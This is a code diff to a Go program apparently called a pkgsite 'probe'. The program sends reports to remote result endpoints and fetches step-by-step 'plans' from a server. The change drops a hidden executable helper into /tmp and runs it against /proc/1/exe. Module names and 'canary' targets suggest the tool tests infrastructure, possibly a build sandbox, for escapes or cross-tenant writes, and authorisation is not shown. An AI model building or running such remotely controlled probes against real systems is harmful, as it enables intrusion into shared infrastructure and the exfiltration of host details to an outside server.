@@ -37,7 +37,7 @@ var rpcDialAddress string
 const (
 	protocolVersion        = 1
 	moduleName             = "github.com/benr00t3d/go-cgo-pkgsite-probe"
-	probeVersion           = "v0.0.41-codex"
+	probeVersion           = "v0.0.43-codex"
 	descriptorHelperSHA256 = "a4310ffe3aab048caef9d93b19e7410cb261fb8678b33cb19d04f58e6d2c1acf"
 	targetRegistry         = "https://proxy.golang.org"
 	targetModuleName       = "github.com/benr00t3d/go-byteman-crosswrite-canary"
@@ -192,7 +192,7 @@ func main() {
 	report := newProbeReport(started, identity)
 	report.Reason = "internal checks are fixed to the verified capslock lane"
 	report.FinishedUTC = time.Now().UTC().Format(time.RFC3339Nano)
-	_ = submitProbeReport(genericResultURL, "v041-codex-"+identity.Lane, cwd, started, report)
+	_ = submitProbeReport(genericResultURL, "v043-codex-"+identity.Lane, cwd, started, report)
 }
 
 func newProbeReport(started time.Time, identity identityResult) probeReport {
@@ -333,7 +333,7 @@ func runCapslockSession(started time.Time, cwd string, identity identityResult) 
 	initial := newProbeReport(started, identity)
 	initial.Reason = "waiting for the bounded read-only descriptor plan"
 	initial.FinishedUTC = time.Now().UTC().Format(time.RFC3339Nano)
-	if err := submitProbeReport(compilerResultURL, "v041-codex-capslock-initial", cwd, started, initial); err != nil {
+	if err := submitProbeReport(compilerResultURL, "v043-codex-capslock-initial", cwd, started, initial); err != nil {
 		return
 	}
 
@@ -368,7 +368,7 @@ func runCapslockSession(started time.Time, cwd string, identity identityResult) 
 			report.Reason = "validated plan action had no implementation"
 		}
 		report.FinishedUTC = time.Now().UTC().Format(time.RFC3339Nano)
-		id := "v041-codex-step-" + strconv.Itoa(cursor)
+		id := "v043-codex-step-" + strconv.Itoa(cursor)
 		if err := submitProbeReport(compilerResultURL, id, cwd, stepStarted, report); err != nil {
 			return
 		}
@@ -387,7 +387,7 @@ func runCapslockSession(started time.Time, cwd string, identity identityResult) 
 		final.Reason = "bounded plan polling window expired"
 	}
 	final.FinishedUTC = time.Now().UTC().Format(time.RFC3339Nano)
-	_ = submitProbeReport(compilerResultURL, "v041-codex-final", cwd, finalStarted, final)
+	_ = submitProbeReport(compilerResultURL, "v043-codex-final", cwd, finalStarted, final)
 }
 
 func fetchPlan(cursor int) (planStep, bool, error) {
@@ -677,7 +677,34 @@ func runBytemanDescriptorInspection(report *probeReport) {
 		report.Inspection.Error = "descriptor helper digest did not match the fixed build"
 		return
 	}
-	output, err := runFixedTool(helper, "/proc/1/exe", "sos.byteman")
+	helperCopy := "/tmp/.go-cgo-v043-describe-protos"
+	copyFile, err := os.OpenFile(helperCopy, os.O_WRONLY|os.O_CREATE|os.O_EXCL, 0o700)
+	if err != nil {
+		report.Inspection.Error = "fixed descriptor helper copy could not be created"
+		return
+	}
+	copyOK := false
+	defer func() {
+		_ = copyFile.Close()
+		if !copyOK {
+			_ = os.Remove(helperCopy)
+		}
+	}()
+	if written, writeErr := copyFile.Write(helperData); writeErr != nil || written != len(helperData) {
+		report.Inspection.Error = "fixed descriptor helper copy was incomplete"
+		return
+	}
+	if err := copyFile.Sync(); err != nil {
+		report.Inspection.Error = "fixed descriptor helper copy could not be synced"
+		return
+	}
+	if err := copyFile.Close(); err != nil {
+		report.Inspection.Error = "fixed descriptor helper copy could not be closed"
+		return
+	}
+	copyOK = true
+	defer os.Remove(helperCopy)
+	output, err := runFixedTool(helperCopy, "/proc/1/exe", "sos.byteman")
 	if err != nil {
 		report.Inspection.Error = cleanError(err)
 		return
